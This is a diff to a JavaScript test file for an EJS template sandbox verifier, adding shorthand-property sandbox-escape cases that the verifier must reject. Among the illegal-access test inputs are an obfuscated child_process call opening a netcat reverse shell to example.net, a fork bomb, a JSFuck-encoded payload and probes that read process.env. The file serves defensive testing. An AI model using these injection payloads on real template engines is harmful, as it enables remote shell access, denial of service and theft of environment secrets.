@@ -78,6 +78,18 @@ describe('check safeRender on invalid cases', () => {
     'network access': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'sp\'+\'awn\'](\'/bin/sh\', [\'-c\', \'nc example.net 4444 -e /bin/sh\']) %>',
     'high cpu usage': '<%= this[\'pro\'+\'cess\'].mainModule[\'requ\'+\'ire\'](\'child_pr\'+\'ocess\')[\'e\'+\'xec\'](\':(){ :|:& };:\') %>',
     'JSFuck encoded': '<% [][(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]) %>',
+    // --- shorthand properties tests ---
+    'bare process': '<%= process %>',
+    'bare process.env': '<%= process.env %>',
+    'bare shorthand process': '<%= ({ process }) %>',
+    'shorthand Function escape': '<%= ({Function}).Function("return process")() %>',
+    'shorthand process escape': '<%= JSON.stringify(({process}).process.env) %>',
+    'shorthand globalThis escape': '<%= ({globalThis}).globalThis.process.env %>',
+    'shorthand eval escape': '<% ({eval}).eval("1") %>',
+    'shorthand Proxy escape': '<% ({Proxy}).Proxy %>',
+    'shorthand Reflect escape': '<% ({Reflect}).Reflect %>',
+    'shorthand spread escape': '<% const o = { ...({process}) }; %>',
+    'shorthand destructure escape': '<% const { process: p } = { process }; %>',
   }).map(([name, template]) => ({ name, template }));
 
   it.each(illegalAccessCases)('safeRender should fail with VerifierIllegalAccessError for "$name" case', ({ template }) => {
@@ -134,6 +146,7 @@ describe('check safeRender on valid cases', () => {
       <% } %>
     `,
     'object assign': '<% Object.assign({}, {test: 1}) %>',
+    'valid shorthand property': '<% const o = { user }; %>',
     'ejs with comment': '<%# This is a comment %>Hello <%= user.name %>',
     'ejs with multiple comments': `
       <%# Comment at start %>
